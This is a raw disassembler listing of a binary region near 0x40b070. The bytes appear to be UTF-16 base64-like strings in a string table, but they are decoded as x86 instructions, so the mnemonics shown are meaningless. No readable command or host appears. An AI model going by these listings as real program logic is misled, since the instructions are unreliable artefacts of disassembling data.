  40b070:	00 79 00             	add    %bh,0x0(%ecx)
  40b073:	6b 00 6d             	imul   $0x6d,(%eax),%eax
  40b076:	00 48 00             	add    %cl,0x0(%eax)
  40b079:	58                   	pop    %eax
  40b07a:	00 68 00             	add    %ch,0x0(%eax)
  40b07d:	44                   	inc    %esp
  40b07e:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
  40b082:	00 73 00             	add    %dh,0x0(%ebx)
  40b085:	4c                   	dec    %esp
  40b086:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
  40b08a:	00 45 00             	add    %al,0x0(%ebp)
  40b08d:	6d                   	insl   (%dx),%es:(%edi)
  40b08e:	00 2f                	add    %ch,(%edi)
  40b090:	00 58 00             	add    %bl,0x0(%eax)
  40b093:	49                   	dec    %ecx
  40b094:	00 2b                	add    %ch,(%ebx)
  40b096:	00 69 00             	add    %ch,0x0(%ecx)
  40b099:	66 00 4a 00          	data16 add %cl,0x0(%edx)
  40b09d:	4b                   	dec    %ebx
  40b09e:	00 30                	add    %dh,(%eax)
  40b0a0:	00 4c 00 7a          	add    %cl,0x7a(%eax,%eax,1)
  40b0a4:	00 42 00             	add    %al,0x0(%edx)
  40b0a7:	58                   	pop    %eax
  40b0a8:	00 53 00             	add    %dl,0x0(%ebx)
  40b0ab:	5a                   	pop    %edx
  40b0ac:	00 52 00             	add    %dl,0x0(%edx)
  40b0af:	57                   	push   %edi
  40b0b0:	00 5a 00             	add    %bl,0x0(%edx)
  40b0b3:	37                   	aaa
  40b0b4:	00 33                	add    %dh,(%ebx)
  40b0b6:	00 74 00 44          	add    %dh,0x44(%eax,%eax,1)
  40b0ba:	00 66 00             	add    %ah,0x0(%esi)
  40b0bd:	57                   	push   %edi
  40b0be:	00 7a 00             	add    %bh,0x0(%edx)
  40b0c1:	49                   	dec    %ecx
  40b0c2:	00 65 00             	add    %ah,0x0(%ebp)
  40b0c5:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40b0c9:	46                   	inc    %esi
  40b0ca:	00 43 00             	add    %al,0x0(%ebx)
  40b0cd:	44                   	inc    %esp
  40b0ce:	00 33                	add    %dh,(%ebx)
  40b0d0:	00 69 00             	add    %ch,0x0(%ecx)
  40b0d3:	77 00                	ja     0x40b0d5
  40b0d5:	59                   	pop    %ecx
  40b0d6:	00 4f 00             	add    %cl,0x0(%edi)
  40b0d9:	53                   	push   %ebx
  40b0da:	00 59 00             	add    %bl,0x0(%ecx)
  40b0dd:	43                   	inc    %ebx
  40b0de:	00 6b 00             	add    %ch,0x0(%ebx)
  40b0e1:	31 00                	xor    %eax,(%eax)
  40b0e3:	62 00                	bound  %eax,(%eax)
  40b0e5:	73 00                	jae    0x40b0e7
  40b0e7:	66 00 6a 00          	data16 add %ch,0x0(%edx)
  40b0eb:	6d                   	insl   (%dx),%es:(%edi)
  40b0ec:	00 55 00             	add    %dl,0x0(%ebp)
  40b0ef:	63 00                	arpl   %eax,(%eax)
  40b0f1:	51                   	push   %ecx
  40b0f2:	00 55 00             	add    %dl,0x0(%ebp)
  40b0f5:	63 00                	arpl   %eax,(%eax)
  40b0f7:	79 00                	jns    0x40b0f9
  40b0f9:	2b 00                	sub    (%eax),%eax
  40b0fb:	64 00 37             	add    %dh,%fs:(%edi)
  40b0fe:	00 6e 00             	add    %ch,0x0(%esi)
  40b101:	61                   	popa
  40b102:	00 38                	add    %bh,(%eax)
  40b104:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
  40b108:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
  40b10c:	00 69 00             	add    %ch,0x0(%ecx)
  40b10f:	30 00                	xor    %al,(%eax)
  40b111:	32 00                	xor    (%eax),%al
  40b113:	43                   	inc    %ebx
  40b114:	00 61 00             	add    %ah,0x0(%ecx)
  40b117:	77 00                	ja     0x40b119
  40b119:	73 00                	jae    0x40b11b
  40b11b:	57                   	push   %edi
  40b11c:	00 78 00             	add    %bh,0x0(%eax)
  40b11f:	71 00                	jno    0x40b121
  40b121:	44                   	inc    %esp
  40b122:	00 4f 00             	add    %cl,0x0(%edi)
  40b125:	73 00                	jae    0x40b127
  40b127:	4d                   	dec    %ebp
  40b128:	00 76 00             	add    %dh,0x0(%esi)
  40b12b:	47                   	inc    %edi
  40b12c:	00 6e 00             	add    %ch,0x0(%esi)
  40b12f:	4c                   	dec    %esp
  40b130:	00 79 00             	add    %bh,0x0(%ecx)
  40b133:	6d                   	insl   (%dx),%es:(%edi)
  40b134:	00 62 00             	add    %ah,0x0(%edx)
  40b137:	45                   	inc    %ebp
  40b138:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
  40b13c:	00 52 00             	add    %dl,0x0(%edx)
  40b13f:	30 00                	xor    %al,(%eax)
  40b141:	62 00                	bound  %eax,(%eax)
  40b143:	43                   	inc    %ebx
  40b144:	00 46 00             	add    %al,0x0(%esi)
  40b147:	38 00                	cmp    %al,(%eax)
  40b149:	4a                   	dec    %edx
  40b14a:	00 5a 00             	add    %bl,0x0(%edx)
  40b14d:	4c                   	dec    %esp
  40b14e:	00 59 00             	add    %bl,0x0(%ecx)
  40b151:	6c                   	insb   (%dx),%es:(%edi)
  40b152:	00 43 00             	add    %al,0x0(%ebx)
  40b155:	4a                   	dec    %edx
  40b156:	00 4e 00             	add    %cl,0x0(%esi)
  40b159:	57                   	push   %edi
  40b15a:	00 41 00             	add    %al,0x0(%ecx)
  40b15d:	51                   	push   %ecx
  40b15e:	00 59 00             	add    %bl,0x0(%ecx)
  40b161:	4f                   	dec    %edi
  40b162:	00 67 00             	add    %ah,0x0(%edi)
  40b165:	43                   	inc    %ebx
  40b166:	00 63 00             	add    %ah,0x0(%ebx)
  40b169:	73 00                	jae    0x40b16b
  40b16b:	4f                   	dec    %edi
  40b16c:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
  40b170:	00 4e 00             	add    %cl,0x0(%esi)
  40b173:	4d                   	dec    %ebp
  40b174:	00 6a 00             	add    %ch,0x0(%edx)
  40b177:	37                   	aaa
  40b178:	00 57 00             	add    %dl,0x0(%edi)
  40b17b:	48                   	dec    %eax
  40b17c:	00 52 00             	add    %dl,0x0(%edx)
  40b17f:	7a 00                	jp     0x40b181
  40b181:	72 00                	jb     0x40b183
  40b183:	65 00 44 00 55       	add    %al,%gs:0x55(%eax,%eax,1)
  40b188:	00 79 00             	add    %bh,0x0(%ecx)
  40b18b:	54                   	push   %esp
  40b18c:	00 43 00             	add    %al,0x0(%ebx)
  40b18f:	6a 00                	push   $0x0
  40b191:	33 00                	xor    (%eax),%eax
  40b193:	62 00                	bound  %eax,(%eax)
  40b195:	72 00                	jb     0x40b197
  40b197:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
  40b19b:	50                   	push   %eax
  40b19c:	00 58 00             	add    %bl,0x0(%eax)
  40b19f:	53                   	push   %ebx
  40b1a0:	00 61 00             	add    %ah,0x0(%ecx)
  40b1a3:	34 00                	xor    $0x0,%al
  40b1a5:	49                   	dec    %ecx
  40b1a6:	00 65 00             	add    %ah,0x0(%ebp)
  40b1a9:	75 00                	jne    0x40b1ab
  40b1ab:	78 00                	js     0x40b1ad
  40b1ad:	37                   	aaa
  40b1ae:	00 72 00             	add    %dh,0x0(%edx)
  40b1b1:	4f                   	dec    %edi
  40b1b2:	00 73 00             	add    %dh,0x0(%ebx)
  40b1b5:	59                   	pop    %ecx
  40b1b6:	00 47 00             	add    %al,0x0(%edi)
  40b1b9:	4b                   	dec    %ebx
  40b1ba:	00 70 00             	add    %dh,0x0(%eax)
  40b1bd:	41                   	inc    %ecx
  40b1be:	00 63 00             	add    %ah,0x0(%ebx)
  40b1c1:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1c2:	00 42 00             	add    %al,0x0(%edx)
  40b1c5:	6d                   	insl   (%dx),%es:(%edi)
  40b1c6:	00 44 00 2b          	add    %al,0x2b(%eax,%eax,1)
  40b1ca:	00 50 00             	add    %dl,0x0(%eax)
  40b1cd:	4f                   	dec    %edi
  40b1ce:	00 46 00             	add    %al,0x0(%esi)
  40b1d1:	43                   	inc    %ebx
  40b1d2:	00 4e 00             	add    %cl,0x0(%esi)
  40b1d5:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1d6:	00 38                	add    %bh,(%eax)
  40b1d8:	00 71 00             	add    %dh,0x0(%ecx)
  40b1db:	57                   	push   %edi
  40b1dc:	00 48 00             	add    %cl,0x0(%eax)
  40b1df:	53                   	push   %ebx
  40b1e0:	00 53 00             	add    %dl,0x0(%ebx)
  40b1e3:	4e                   	dec    %esi
  40b1e4:	00 68 00             	add    %ch,0x0(%eax)
  40b1e7:	7a 00                	jp     0x40b1e9
  40b1e9:	57                   	push   %edi
  40b1ea:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b1ed:	6d                   	insl   (%dx),%es:(%edi)
  40b1ee:	00 51 00             	add    %dl,0x0(%ecx)
  40b1f1:	70 00                	jo     0x40b1f3
  40b1f3:	6d                   	insl   (%dx),%es:(%edi)
  40b1f4:	00 70 00             	add    %dh,0x0(%eax)
  40b1f7:	76 00                	jbe    0x40b1f9
  40b1f9:	79 00                	jns    0x40b1fb
  40b1fb:	68 00 38 00 61       	push   $0x61003800
  40b200:	00 6a 00             	add    %ch,0x0(%edx)
  40b203:	50                   	push   %eax
  40b204:	00 49 00             	add    %cl,0x0(%ecx)
  40b207:	58                   	pop    %eax
  40b208:	00 7a 00             	add    %bh,0x0(%edx)
  40b20b:	72 00                	jb     0x40b20d
  40b20d:	63 00                	arpl   %eax,(%eax)
  40b20f:	4b                   	dec    %ebx
  40b210:	00 30                	add    %dh,(%eax)
  40b212:	00 36                	add    %dh,(%esi)
  40b214:	00 72 00             	add    %dh,0x0(%edx)
  40b217:	38 00                	cmp    %al,(%eax)
  40b219:	48                   	dec    %eax
  40b21a:	00 33                	add    %dh,(%ebx)
  40b21c:	00 33                	add    %dh,(%ebx)
  40b21e:	00 78 00             	add    %bh,0x0(%eax)
  40b221:	2b 00                	sub    (%eax),%eax
  40b223:	31 00                	xor    %eax,(%eax)
  40b225:	74 00                	je     0x40b227
  40b227:	42                   	inc    %edx
  40b228:	00 77 00             	add    %dh,0x0(%edi)
  40b22b:	76 00                	jbe    0x40b22d
  40b22d:	47                   	inc    %edi
  40b22e:	00 31                	add    %dh,(%ecx)
  40b230:	00 59 00             	add    %bl,0x0(%ecx)
  40b233:	50                   	push   %eax
  40b234:	00 70 00             	add    %dh,0x0(%eax)
  40b237:	70 00                	jo     0x40b239
  40b239:	51                   	push   %ecx
  40b23a:	00 6e 00             	add    %ch,0x0(%esi)
  40b23d:	76 00                	jbe    0x40b23f
  40b23f:	78 00                	js     0x40b241
  40b241:	39 00                	cmp    %eax,(%eax)
  40b243:	34 00                	xor    $0x0,%al
  40b245:	56                   	push   %esi
  40b246:	00 4d 00             	add    %cl,0x0(%ebp)
  40b249:	75 00                	jne    0x40b24b
  40b24b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b24c:	00 4a 00             	add    %cl,0x0(%edx)
  40b24f:	41                   	inc    %ecx
  40b250:	00 7a 00             	add    %bh,0x0(%edx)
  40b253:	5a                   	pop    %edx
  40b254:	00 69 00             	add    %ch,0x0(%ecx)
  40b257:	2f                   	das
  40b258:	00 4b 00             	add    %cl,0x0(%ebx)
  40b25b:	4a                   	dec    %edx
  40b25c:	00 2b                	add    %ch,(%ebx)
  40b25e:	00 33                	add    %dh,(%ebx)
  40b260:	00 31                	add    %dh,(%ecx)
  40b262:	00 65 00             	add    %ah,0x0(%ebp)
  40b265:	45                   	inc    %ebp
  40b266:	00 36                	add    %dh,(%esi)
  40b268:	00 4b 00             	add    %cl,0x0(%ebx)
  40b26b:	32 00                	xor    (%eax),%al
  40b26d:	6b 00 63             	imul   $0x63,(%eax),%eax
  40b270:	00 31                	add    %dh,(%ecx)
  40b272:	00 43 00             	add    %al,0x0(%ebx)
  40b275:	57                   	push   %edi
  40b276:	00 49 00             	add    %cl,0x0(%ecx)
  40b279:	38 00                	cmp    %al,(%eax)
  40b27b:	71 00                	jno    0x40b27d
  40b27d:	71 00                	jno    0x40b27f
  40b27f:	35 00 78 00 53       	xor    $0x53007800,%eax
  40b284:	00 73 00             	add    %dh,0x0(%ebx)
  40b287:	6e                   	outsb  %ds:(%esi),(%dx)
  40b288:	00 4f 00             	add    %cl,0x0(%edi)
  40b28b:	34 00                	xor    $0x0,%al
  40b28d:	32 00                	xor    (%eax),%al
  40b28f:	53                   	push   %ebx
  40b290:	00 52 00             	add    %dl,0x0(%edx)
  40b293:	56                   	push   %esi
  40b294:	00 5a 00             	add    %bl,0x0(%edx)
  40b297:	2b 00                	sub    (%eax),%eax
  40b299:	72 00                	jb     0x40b29b
  40b29b:	35 00 4a 00 52       	xor    $0x52004a00,%eax
  40b2a0:	00 4e 00             	add    %cl,0x0(%esi)
  40b2a3:	62 00                	bound  %eax,(%eax)
  40b2a5:	68 00 76 00 4c       	push   $0x4c007600
  40b2aa:	00 6b 00             	add    %ch,0x0(%ebx)
  40b2ad:	2f                   	das
  40b2ae:	00 61 00             	add    %ah,0x0(%ecx)
  40b2b1:	5a                   	pop    %edx
  40b2b2:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40b2b6:	00 44 00 62          	add    %al,0x62(%eax,%eax,1)
  40b2ba:	00 79 00             	add    %bh,0x0(%ecx)
  40b2bd:	34 00                	xor    $0x0,%al
  40b2bf:	61                   	popa
  40b2c0:	00 39                	add    %bh,(%ecx)
  40b2c2:	00 58 00             	add    %bl,0x0(%eax)
  40b2c5:	44                   	inc    %esp
  40b2c6:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b2c9:	41                   	inc    %ecx
  40b2ca:	00 33                	add    %dh,(%ebx)
  40b2cc:	00 4e 00             	add    %cl,0x0(%esi)
  40b2cf:	75 00                	jne    0x40b2d1
  40b2d1:	6c                   	insb   (%dx),%es:(%edi)
  40b2d2:	00 6b 00             	add    %ch,0x0(%ebx)
  40b2d5:	30 00                	xor    %al,(%eax)
  40b2d7:	66 00 64 00 41       	data16 add %ah,0x41(%eax,%eax,1)
  40b2dc:	00 72 00             	add    %dh,0x0(%edx)
  40b2df:	79 00                	jns    0x40b2e1
  40b2e1:	2b 00                	sub    (%eax),%eax
  40b2e3:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  40b2e7:	36 00 67 00          	add    %ah,%ss:0x0(%edi)
  40b2eb:	31 00                	xor    %eax,(%eax)
  40b2ed:	4b                   	dec    %ebx
  40b2ee:	00 30                	add    %dh,(%eax)
  40b2f0:	00 57 00             	add    %dl,0x0(%edi)
  40b2f3:	30 00                	xor    %al,(%eax)
  40b2f5:	6d                   	insl   (%dx),%es:(%edi)
  40b2f6:	00 30                	add    %dh,(%eax)
  40b2f8:	00 35 00 66 00 33    	add    %dh,0x33006600
  40b2fe:	00 71 00             	add    %dh,0x0(%ecx)
  40b301:	73 00                	jae    0x40b303
  40b303:	4e                   	dec    %esi
  40b304:	00 49 00             	add    %cl,0x0(%ecx)
  40b307:	32 00                	xor    (%eax),%al
  40b309:	38 00                	cmp    %al,(%eax)
  40b30b:	54                   	push   %esp
  40b30c:	00 30                	add    %dh,(%eax)
  40b30e:	00 44 00 6d          	add    %al,0x6d(%eax,%eax,1)
  40b312:	00 79 00             	add    %bh,0x0(%ecx)
  40b315:	71 00                	jno    0x40b317
  40b317:	62 00                	bound  %eax,(%eax)
  40b319:	36 00 55 00          	add    %dl,%ss:0x0(%ebp)
  40b31d:	38 00                	cmp    %al,(%eax)
  40b31f:	77 00                	ja     0x40b321
  40b321:	4d                   	dec    %ebp
  40b322:	00 6a 00             	add    %ch,0x0(%edx)
  40b325:	52                   	push   %edx
  40b326:	00 55 00             	add    %dl,0x0(%ebp)
  40b329:	7a 00                	jp     0x40b32b
  40b32b:	33 00                	xor    (%eax),%eax
  40b32d:	54                   	push   %esp
  40b32e:	00 35 00 56 00 33    	add    %dh,0x33005600
  40b334:	00 57 00             	add    %dl,0x0(%edi)
  40b337:	38 00                	cmp    %al,(%eax)
  40b339:	74 00                	je     0x40b33b
  40b33b:	4e                   	dec    %esi
  40b33c:	00 6a 00             	add    %ch,0x0(%edx)
  40b33f:	51                   	push   %ecx
  40b340:	00 31                	add    %dh,(%ecx)
  40b342:	00 52 00             	add    %dl,0x0(%edx)
  40b345:	5a                   	pop    %edx
  40b346:	00 4a 00             	add    %cl,0x0(%edx)
  40b349:	4c                   	dec    %esp
  40b34a:	00 58 00             	add    %bl,0x0(%eax)
  40b34d:	4f                   	dec    %edi
  40b34e:	00 6b 00             	add    %ch,0x0(%ebx)
  40b351:	41                   	inc    %ecx
  40b352:	00 79 00             	add    %bh,0x0(%ecx)
  40b355:	50                   	push   %eax
  40b356:	00 58 00             	add    %bl,0x0(%eax)
  40b359:	58                   	pop    %eax
  40b35a:	00 49 00             	add    %cl,0x0(%ecx)
  40b35d:	42                   	inc    %edx
  40b35e:	00 53 00             	add    %dl,0x0(%ebx)
  40b361:	41                   	inc    %ecx
  40b362:	00 4e 00             	add    %cl,0x0(%esi)
  40b365:	51                   	push   %ecx
  40b366:	00 6e 00             	add    %ch,0x0(%esi)
  40b369:	4c                   	dec    %esp
  40b36a:	00 4d 00             	add    %cl,0x0(%ebp)
  40b36d:	56                   	push   %esi
  40b36e:	00 64 00 56          	add    %ah,0x56(%eax,%eax,1)
  40b372:	00 72 00             	add    %dh,0x0(%edx)
  40b375:	65 00 35 00 44 00 38 	add    %dh,%gs:0x38004400
  40b37c:	00 4d 00             	add    %cl,0x0(%ebp)
  40b37f:	44                   	inc    %esp
  40b380:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
  40b384:	00 51 00             	add    %dl,0x0(%ecx)
  40b387:	35 00 61 00 35       	xor    $0x35006100,%eax
  40b38c:	00 59 00             	add    %bl,0x0(%ecx)
  40b38f:	42                   	inc    %edx
  40b390:	00 7a 00             	add    %bh,0x0(%edx)
  40b393:	36 00 4c 00 67       	add    %cl,%ss:0x67(%eax,%eax,1)
  40b398:	00 67 00             	add    %ah,0x0(%edi)
  40b39b:	4b                   	dec    %ebx
  40b39c:	00 37                	add    %dh,(%edi)
  40b39e:	00 59 00             	add    %bl,0x0(%ecx)
  40b3a1:	4e                   	dec    %esi
  40b3a2:	00 6d 00             	add    %ch,0x0(%ebp)
  40b3a5:	4f                   	dec    %edi
  40b3a6:	00 4f 00             	add    %cl,0x0(%edi)
  40b3a9:	44                   	inc    %esp
  40b3aa:	00 79 00             	add    %bh,0x0(%ecx)
  40b3ad:	43                   	inc    %ebx
  40b3ae:	00 56 00             	add    %dl,0x0(%esi)
  40b3b1:	36 00 57 00          	add    %dl,%ss:0x0(%edi)
  40b3b5:	6d                   	insl   (%dx),%es:(%edi)
  40b3b6:	00 65 00             	add    %ah,0x0(%ebp)
  40b3b9:	76 00                	jbe    0x40b3bb
  40b3bb:	45                   	inc    %ebp
  40b3bc:	00 69 00             	add    %ch,0x0(%ecx)
  40b3bf:	45                   	inc    %ebp
  40b3c0:	00 4b 00             	add    %cl,0x0(%ebx)
  40b3c3:	62 00                	bound  %eax,(%eax)
  40b3c5:	52                   	push   %edx
  40b3c6:	00 2b                	add    %ch,(%ebx)
  40b3c8:	00 56 00             	add    %dl,0x0(%esi)
  40b3cb:	37                   	aaa
  40b3cc:	00 73 00             	add    %dh,0x0(%ebx)
  40b3cf:	64 00 45 00          	add    %al,%fs:0x0(%ebp)
  40b3d3:	38 00                	cmp    %al,(%eax)
  40b3d5:	69 00 67 00 48 00    	imul   $0x480067,(%eax),%eax
  40b3db:	67 00 30             	add    %dh,(%bx,%si)
  40b3de:	00 6d 00             	add    %ch,0x0(%ebp)
  40b3e1:	51                   	push   %ecx
  40b3e2:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b3e8:	80 b1 78 00 31 00 62 	xorb   $0x62,0x310078(%ecx)
  40b3ef:	00 46 00             	add    %al,0x0(%esi)
  40b3f2:	6e                   	outsb  %ds:(%esi),(%dx)
  40b3f3:	00 41 00             	add    %al,0x0(%ecx)
  40b3f6:	7a 00                	jp     0x40b3f8
  40b3f8:	4d                   	dec    %ebp
  40b3f9:	00 57 00             	add    %dl,0x0(%edi)
  40b3fc:	6a 00                	push   $0x0
  40b3fe:	57                   	push   %edi
  40b3ff:	00 30                	add    %dh,(%eax)
  40b401:	00 76 00             	add    %dh,0x0(%esi)
  40b404:	66 00 6b 00          	data16 add %ch,0x0(%ebx)
  40b408:	2b 00                	sub    (%eax),%eax
  40b40a:	61                   	popa
  40b40b:	00 38                	add    %bh,(%eax)
  40b40d:	00 32                	add    %dh,(%edx)
  40b40f:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40b413:	00 76 00             	add    %dh,0x0(%esi)
  40b416:	56                   	push   %esi
  40b417:	00 36                	add    %dh,(%esi)
  40b419:	00 38                	add    %bh,(%eax)
  40b41b:	00 4b 00             	add    %cl,0x0(%ebx)
  40b41e:	6b 00 7a             	imul   $0x7a,(%eax),%eax
  40b421:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
  40b425:	00 42 00             	add    %al,0x0(%edx)
  40b428:	69 00 30 00 33 00    	imul   $0x330030,(%eax),%eax
  40b42e:	4e                   	dec    %esi
  40b42f:	00 69 00             	add    %ch,0x0(%ecx)
  40b432:	42                   	inc    %edx
  40b433:	00 42 00             	add    %al,0x0(%edx)
  40b436:	72 00                	jb     0x40b438
  40b438:	55                   	push   %ebp
  40b439:	00 32                	add    %dh,(%edx)
  40b43b:	00 7a 00             	add    %bh,0x0(%edx)
  40b43e:	35 00 4e 00 55       	xor    $0x55004e00,%eax
  40b443:	00 69 00             	add    %ch,0x0(%ecx)
  40b446:	74 00                	je     0x40b448
  40b448:	43                   	inc    %ebx
  40b449:	00 32                	add    %dh,(%edx)
  40b44b:	00 47 00             	add    %al,0x0(%edi)
  40b44e:	73 00                	jae    0x40b450
  40b450:	53                   	push   %ebx
  40b451:	00 6d 00             	add    %ch,0x0(%ebp)
  40b454:	53                   	push   %ebx
  40b455:	00 69 00             	add    %ch,0x0(%ecx)
  40b458:	54                   	push   %esp
  40b459:	00 32                	add    %dh,(%edx)
  40b45b:	00 4d 00             	add    %cl,0x0(%ebp)
  40b45e:	4c                   	dec    %esp
  40b45f:	00 75 00             	add    %dh,0x0(%ebp)
  40b462:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
  40b466:	37                   	aaa
  40b467:	00 38                	add    %bh,(%eax)
  40b469:	00 57 00             	add    %dl,0x0(%edi)
  40b46c:	4e                   	dec    %esi
  40b46d:	00 77 00             	add    %dh,0x0(%edi)
  40b470:	79 00                	jns    0x40b472
  40b472:	45                   	inc    %ebp
  40b473:	00 6c 00 34          	add    %ch,0x34(%eax,%eax,1)
  40b477:	00 55 00             	add    %dl,0x0(%ebp)
  40b47a:	4c                   	dec    %esp
  40b47b:	00 4f 00             	add    %cl,0x0(%edi)
  40b47e:	52                   	push   %edx
  40b47f:	00 68 00             	add    %ch,0x0(%eax)
  40b482:	4e                   	dec    %esi
  40b483:	00 44 00 64          	add    %al,0x64(%eax,%eax,1)
  40b487:	00 73 00             	add    %dh,0x0(%ebx)
  40b48a:	79 00                	jns    0x40b48c
  40b48c:	45                   	inc    %ebp
  40b48d:	00 73 00             	add    %dh,0x0(%ebx)
  40b490:	56                   	push   %esi
  40b491:	00 6f 00             	add    %ch,0x0(%edi)
  40b494:	51                   	push   %ecx
  40b495:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b49b:	80 b1 7a 00 39 00 4e 	xorb   $0x4e,0x39007a(%ecx)
  40b4a2:	00 50 00             	add    %dl,0x0(%eax)
  40b4a5:	44                   	inc    %esp
  40b4a6:	00 6c 00 66          	add    %ch,0x66(%eax,%eax,1)
  40b4aa:	00 6a 00             	add    %ch,0x0(%edx)
  40b4ad:	34 00                	xor    $0x0,%al
  40b4af:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40b4b3:	34 00                	xor    $0x0,%al
  40b4b5:	32 00                	xor    (%eax),%al
  40b4b7:	4e                   	dec    %esi
  40b4b8:	00 58 00             	add    %bl,0x0(%eax)
  40b4bb:	6e                   	outsb  %ds:(%esi),(%dx)
  40b4bc:	00 64 00 62          	add    %ah,0x62(%eax,%eax,1)
  40b4c0:	00 51 00             	add    %dl,0x0(%ecx)
  40b4c3:	6e                   	outsb  %ds:(%esi),(%dx)
  40b4c4:	00 69 00             	add    %ch,0x0(%ecx)
  40b4c7:	7a 00                	jp     0x40b4c9
  40b4c9:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40b4cd:	6a 00                	push   $0x0
  40b4cf:	59                   	pop    %ecx
  40b4d0:	00 39                	add    %bh,(%ecx)
  40b4d2:	00 6d 00             	add    %ch,0x0(%ebp)
  40b4d5:	6b 00 46             	imul   $0x46,(%eax),%eax
  40b4d8:	00 43 00             	add    %al,0x0(%ebx)
  40b4db:	6f                   	outsl  %ds:(%esi),(%dx)
  40b4dc:	00 55 00             	add    %dl,0x0(%ebp)
  40b4df:	5a                   	pop    %edx
  40b4e0:	00 44 00 4c          	add    %al,0x4c(%eax,%eax,1)
  40b4e4:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b4e7:	76 00                	jbe    0x40b4e9
  40b4e9:	6a 00                	push   $0x0
  40b4eb:	55                   	push   %ebp
  40b4ec:	00 32                	add    %dh,(%edx)
  40b4ee:	00 76 00             	add    %dh,0x0(%esi)
  40b4f1:	4f                   	dec    %edi
  40b4f2:	00 2f                	add    %ch,(%edi)
  40b4f4:	00 72 00             	add    %dh,0x0(%edx)
  40b4f7:	52                   	push   %edx
  40b4f8:	00 4d 00             	add    %cl,0x0(%ebp)
  40b4fb:	65 00 4c 00 41       	add    %cl,%gs:0x41(%eax,%eax,1)
  40b500:	00 6e 00             	add    %ch,0x0(%esi)
  40b503:	4b                   	dec    %ebx
  40b504:	00 70 00             	add    %dh,0x0(%eax)
  40b507:	4a                   	dec    %edx
  40b508:	00 51 00             	add    %dl,0x0(%ecx)
  40b50b:	4e                   	dec    %esi
  40b50c:	00 46 00             	add    %al,0x0(%esi)
  40b50f:	56                   	push   %esi
  40b510:	00 4e 00             	add    %cl,0x0(%esi)
  40b513:	75 00                	jne    0x40b515
  40b515:	46                   	inc    %esi
  40b516:	00 73 00             	add    %dh,0x0(%ebx)
  40b519:	43                   	inc    %ebx
  40b51a:	00 59 00             	add    %bl,0x0(%ecx)
  40b51d:	6d                   	insl   (%dx),%es:(%edi)
  40b51e:	00 67 00             	add    %ah,0x0(%edi)
  40b521:	72 00                	jb     0x40b523
  40b523:	4e                   	dec    %esi
  40b524:	00 58 00             	add    %bl,0x0(%eax)
  40b527:	67 00 77 00          	add    %dh,0x0(%bx)
  40b52b:	74 00                	je     0x40b52d
  40b52d:	6d                   	insl   (%dx),%es:(%edi)
  40b52e:	00 6c 00 36          	add    %ch,0x36(%eax,%eax,1)
  40b532:	00 6c 00 34          	add    %ch,0x34(%eax,%eax,1)
  40b536:	00 36                	add    %dh,(%esi)
  40b538:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40b53c:	00 66 00             	add    %ah,0x0(%esi)
  40b53f:	30 00                	xor    %al,(%eax)
  40b541:	33 00                	xor    (%eax),%eax
  40b543:	36 00 2f             	add    %ch,%ss:(%edi)
  40b546:	00 51 00             	add    %dl,0x0(%ecx)
  40b549:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b54e:	80 b1 44 00 44 00 4a 	xorb   $0x4a,0x440044(%ecx)
  40b555:	00 69 00             	add    %ch,0x0(%ecx)
  40b558:	59                   	pop    %ecx
  40b559:	00 32                	add    %dh,(%edx)
  40b55b:	00 39                	add    %bh,(%ecx)
  40b55d:	00 32                	add    %dh,(%edx)
  40b55f:	00 79 00             	add    %bh,0x0(%ecx)
  40b562:	67 00 4a 00          	add    %cl,0x0(%bp,%si)
  40b566:	34 00                	xor    $0x0,%al
  40b568:	59                   	pop    %ecx
  40b569:	00 6b 00             	add    %ch,0x0(%ebx)
  40b56c:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  40b570:	49                   	dec    %ecx
  40b571:	00 32                	add    %dh,(%edx)
  40b573:	00 37                	add    %dh,(%edi)
  40b575:	00 50 00             	add    %dl,0x0(%eax)
  40b578:	4b                   	dec    %ebx
  40b579:	00 67 00             	add    %ah,0x0(%edi)
  40b57c:	48                   	dec    %eax
  40b57d:	00 7a 00             	add    %bh,0x0(%edx)
  40b580:	78 00                	js     0x40b582
  40b582:	5a                   	pop    %edx
  40b583:	00 6e 00             	add    %ch,0x0(%esi)
  40b586:	49                   	dec    %ecx
  40b587:	00 52 00             	add    %dl,0x0(%edx)
  40b58a:	4a                   	dec    %edx
  40b58b:	00 35 00 31 00 66    	add    %dh,0x66003100
  40b591:	00 66 00             	add    %ah,0x0(%esi)
  40b594:	38 00                	cmp    %al,(%eax)
  40b596:	64 00 68 00          	add    %ch,%fs:0x0(%eax)
  40b59a:	5a                   	pop    %edx
  40b59b:	00 61 00             	add    %ah,0x0(%ecx)
  40b59e:	2b 00                	sub    (%eax),%eax
  40b5a0:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
  40b5a4:	36 00 59 00          	add    %bl,%ss:0x0(%ecx)
  40b5a8:	6f                   	outsl  %ds:(%esi),(%dx)
  40b5a9:	00 62 00             	add    %ah,0x0(%edx)
  40b5ac:	43                   	inc    %ebx
  40b5ad:	00 78 00             	add    %bh,0x0(%eax)
  40b5b0:	2f                   	das
  40b5b1:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
